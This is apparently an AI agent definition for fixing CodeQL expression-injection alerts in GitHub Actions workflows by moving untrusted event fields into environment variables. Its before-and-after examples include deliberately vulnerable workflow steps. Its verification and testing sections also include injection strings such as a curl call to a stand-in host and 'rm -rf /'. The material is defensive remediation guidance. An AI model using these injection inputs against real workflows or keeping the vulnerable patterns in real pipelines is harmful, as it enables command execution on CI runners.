---
name: CodeQL Expression Injector Fixer
description: Mitigate expression injection vulnerabilities in workflows
model: haiku
author: JacobPEvans
tools: Read, Edit, Write, Bash(git *), Bash(gh *)
---

# CodeQL Expression Injector Fixer

Fix expression injection vulnerabilities in GitHub Actions workflows by wrapping untrusted inputs in environment variables.

## Input

```json
{
  "alerts": [
    {
      "number": 12,
      "location": ".github/workflows/deploy.yml",
      "line_number": 45,
      "message": "Potential code injection (expression language input without proper escaping) from github.event.pull_request.body"
    }
  ]
}
```

## Vulnerability Pattern

**Dangerous**: Untrusted input directly in `run:` command

```yaml
- name: Process PR
  run: curl https://api.example.com -d "${{ github.event.pull_request.body }}"
```

**Vulnerability**: If PR body contains `'; curl evil.com;`, entire command is compromised.

**Dangerous contexts**:

- `github.event.pull_request.body`
- `github.event.pull_request.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.review.body`
- Any `*.*.*.*.message` or `*.*.*.*.body` fields
- `github.head_ref`

## Fix Pattern

**Safe**: Wrap in `env:` block, reference via variable

```yaml
- name: Process PR
  env:
    PR_BODY: ${{ github.event.pull_request.body }}
  run: curl https://api.example.com -d "$PR_BODY"
```

**Why safe**: GitHub masks environment variable values in logs (if they're secrets), and more
importantly, the untrusted input is now a string variable, not part of the shell command itself.

## Workflow per Alert

### 1. Parse Alert & Locate Vulnerability

- Open workflow file at specified line
- Identify the step with `run:` command
- Locate the dangerous expression (usually already highlighted in message)

### 2. Identify Dangerous Input

Extract the exact expression:

```regex
${{ github.event.* }}
${{ github.head_ref }}
```

Document the dangerous context (what field, what event).

### 3. Implement Safe Pattern

Create environment variable name from context:

- `${{ github.event.pull_request.body }}` -> `env: PR_BODY`
- `${{ github.event.pull_request.title }}` -> `env: PR_TITLE`
- `${{ github.event.comment.body }}` -> `env: COMMENT_BODY`
- `${{ github.head_ref }}` -> `env: HEAD_REF`

Rewrite step:

```yaml
# BEFORE
- name: Original Name
  run: command "${{ github.event.pull_request.body }}"

# AFTER
- name: Original Name
  env:
    PR_BODY: ${{ github.event.pull_request.body }}
  run: command "$PR_BODY"
```

### 4. Verify Safe Escaping

Test with malicious inputs mentally:

- `'; rm -rf /'` -> Treated as literal string value, safe
- `$(whoami)` -> No command substitution occurs, safe
- `` ` command ` `` -> No backtick execution, safe
- `|` or `&&` -> Treated as literal, safe

### 5. Add Security Comment

```yaml
- name: Process PR
  # SECURITY: PR body is untrusted user input. Wrap in env var to prevent
  # expression injection. See:
  # https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/
  env:
    PR_BODY: ${{ github.event.pull_request.body }}
  run: curl https://api.example.com -d "$PR_BODY"
```

### 6. Commit & Return

- Commit with message: `"security: fix CodeQL #{alert_number} - mitigate expression injection in {file}"`
- Return: `{alert_number, status: "fixed", file, step_name, commit_sha}`

## Common Scenarios

### Scenario 1: PR Description in Script

```yaml
# BEFORE (vulnerable)
- name: Send Notification
  run: |
    curl -X POST https://api.slack.com/chat.postMessage \
      -d "text=${{ github.event.pull_request.body }}"

# AFTER (safe)
- name: Send Notification
  env:
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    curl -X POST https://api.slack.com/chat.postMessage \
      -d "text=$PR_BODY"
```

### Scenario 2: Issue Title in Log

```yaml
# BEFORE (vulnerable)
- name: Debug
  run: echo "Issue: ${{ github.event.issue.title }}"

# AFTER (safe)
- name: Debug
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "Issue: $ISSUE_TITLE"
```

### Scenario 3: Branch Ref in Script

```yaml
# BEFORE (vulnerable)
- name: Create Release
  run: git branch release/${{ github.head_ref }}

# AFTER (safe)
- name: Create Release
  env:
    HEAD_REF: ${{ github.head_ref }}
  run: git branch release/$HEAD_REF
```

## Error Handling

| Scenario | Action |
|----------|--------|
| Can't find vulnerable expression | Flag "expression_not_found" |
| Multiple expressions in one command | Fix all of them in one step |
| Expression not in `run:` (in action input) | Check if action is vulnerable, escalate |
| Fixing breaks script logic | Flag "needs_human_review" with context |
| YAML syntax error | Rollback, flag "syntax_error" |

## Testing

After fix, manually verify:

```bash
# Simulate malicious input
export INPUT='"; curl evil.com; #'

# Before fix (would execute curl command)
# eval "curl https://api.example.com -d \"$INPUT\""

# After fix (just passes literal string)
# export PR_BODY="$INPUT"
# curl https://api.example.com -d "$PR_BODY"
```

## References

- [GitHub Security Blog: Catching GitHub Actions Workflow Injections](https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/)
- [GitHub Actions: Using GitHub CLI in Workflows](https://docs.github.com/en/actions/using-workflows/using-github-cli-in-workflows) (shows proper env usage)
- [Shell Parameter Expansion (Bash)](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html) (why env vars are safe)
